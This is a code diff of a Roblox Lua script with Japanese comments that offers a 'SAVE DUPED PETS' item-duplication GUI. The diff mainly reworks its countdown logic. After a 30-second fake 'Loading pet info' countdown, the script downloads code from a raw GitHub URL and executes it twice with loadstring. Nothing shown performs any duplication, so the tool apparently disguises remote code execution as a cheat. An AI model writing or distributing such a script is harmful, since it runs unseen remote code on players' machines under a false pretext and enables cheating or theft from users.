@@ -14,7 +14,6 @@ local MainSection = MainTab:NewSection("Main Controls")
 local currentTool = "Nothing"
 local toolLabel = MainSection:NewLabel("Holding: " .. currentTool)
 
--- 定期更新：現在持っているツール名を表示
 RunService.RenderStepped:Connect(function()
 	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
 	local name = tool and tool.Name or "Nothing"
@@ -24,7 +23,7 @@ RunService.RenderStepped:Connect(function()
 	end
 end)
 
--- Dupe 回数入力
+-- Dupe Amount 入力
 local dupeAmount = 1
 MainSection:NewTextBox("Dupe Amount (1-100)", "Enter a number", function(text)
 	local number = tonumber(text)
@@ -51,32 +50,29 @@ end)
 -- 状態表示用ラベル
 local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
 
+-- カウント制御フラグ
+local currentCountdownId = 0
+
 -- SAVE DUPED PETS ボタン
-local countdownThread -- 現在のカウントダウン用スレッド
-
 MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
-	-- 既に動作中のカウントダウンがあればキャンセル
-	if countdownThread then
-		countdownThread:Disconnect()
-	end
-
-	local bindable = Instance.new("BindableEvent")
-	countdownThread = bindable.Event:Connect(function() end) -- 空イベントで保持
+	currentCountdownId += 1
+	local thisCountdownId = currentCountdownId
 
 	task.spawn(function()
 		for i = 30, 1, -1 do
+			-- 他のカウントダウンが始まったら中止
+			if thisCountdownId ~= currentCountdownId then return end
 			statusLabel:Update("SAVE STATUS: ⏳ Loading pet info... (" .. i .. "s)")
 			wait(1)
-			if not countdownThread.Connected then
-				return -- 他のカウントダウンに上書きされたら中止
-			end
 		end
+
+		if thisCountdownId ~= currentCountdownId then return end
 
 		statusLabel:Update("SAVE STATUS: 🚀 Booting...")
 
-		-- 同時に2回スクリプト実行
 		local url = "https://raw.githubusercontent.com/aa362/growagardening/refs/heads/main/uitest"
-		for i = 1, 2 do
+
+		for j = 1, 2 do
 			local success, err = pcall(function()
 				loadstring(game:HttpGet(url))()
 			end)
